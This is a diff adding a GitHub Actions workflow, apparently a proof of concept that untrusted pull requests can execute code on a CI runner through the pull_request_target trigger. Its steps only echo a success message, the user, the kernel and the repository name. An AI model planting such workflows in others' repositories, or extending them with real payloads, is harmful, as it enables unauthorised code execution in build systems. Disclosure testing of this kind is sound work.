@@ -1,0 +1,16 @@
+name: PoC — Safe Execution Proof
+
+on:
+  pull_request_target:
+    types: [opened, synchronize]
+
+jobs:
+  poc:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Proof of code execution
+        run: |
+          echo "✅ Arbitrary code execution achieved"
+          echo "Running as: $(whoami)"
+          echo "Kernel: $(uname -a)"
+          echo "GitHub repo: $GITHUB_REPOSITORY"
